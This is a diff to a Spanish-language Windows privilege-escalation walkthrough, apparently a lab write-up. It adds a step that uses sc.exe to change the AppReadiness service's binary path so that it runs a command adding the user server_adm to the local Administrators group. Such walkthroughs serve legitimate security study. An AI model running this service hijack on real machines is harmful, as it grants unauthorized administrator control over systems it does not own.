@@ -369,3 +369,12 @@ net localgroup Administrators
 <img width="719" height="241" alt="image" src="https://github.com/user-attachments/assets/1b55b752-9812-4dea-b3cd-a1fdb23bc2fd" />
 
 En la salida se muestran los miembros del grupo `Administrators`. Vemos que no pertenecemos al grupo.
+
+
+El siguiente paso es modificar la ruta binaria del servicio:
+
+```powershell
+sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+<img width="928" height="105" alt="image" src="https://github.com/user-attachments/assets/9a657404-869f-45bd-bc1c-69a81481287d" />
